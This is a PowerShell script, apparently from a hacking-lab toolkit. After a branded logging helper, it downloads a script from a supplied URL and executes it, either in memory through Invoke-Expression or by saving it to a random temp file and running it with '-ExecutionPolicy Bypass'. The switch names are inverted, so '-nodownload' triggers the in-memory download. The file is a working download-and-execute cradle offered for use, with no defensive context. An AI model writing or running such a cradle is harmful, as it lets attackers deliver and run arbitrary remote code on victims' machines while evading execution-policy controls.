function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message " [*] START JOB ------------------- ELMO9AWIM "



[CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ScriptURL,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $Arguments,

        [Switch]
        $nodownload
    )
    if ($nodownload -eq $true)
    {
        Invoke-Expression ((New-Object Net.WebClient).DownloadString("$ScriptURL"))
        if($Arguments)
        {
            Invoke-Expression $Arguments
        }
    }
    else
    {
        $rand = Get-Random
        $webclient = New-Object System.Net.WebClient
        $file1 = "$env:temp\$rand.ps1"
        $webclient.DownloadFile($ScriptURL,"$file1")
        $script:pastevalue = powershell.exe -ExecutionPolicy Bypass -noLogo -command $file1
        Invoke-Expression $pastevalue
    }
